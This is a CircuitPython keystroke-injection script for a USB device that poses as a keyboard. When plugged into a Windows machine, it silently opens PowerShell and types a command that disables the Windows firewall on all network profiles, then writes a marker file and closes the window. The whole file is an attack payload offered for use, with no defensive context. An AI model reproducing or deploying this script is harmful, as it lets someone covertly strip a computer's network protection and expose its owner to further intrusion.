# Snowman has no idea what he is doing
# My coding is shit
# CircuitPython script
import time
import os
import usb_hid
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

if not 'jobdone.txt' in os.listdir():
    keyboard = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(keyboard)

    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.11)

    layout.write("powershell.exe\n")
    time.sleep(2.00)

    layout.write("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False\n")
    time.sleep(0.50)

    layout.write("New-Item D:\jobdone.txt\n")
    time.sleep(0.50)
    
    keyboard.send(Keycode.ALT, Keycode.F4)
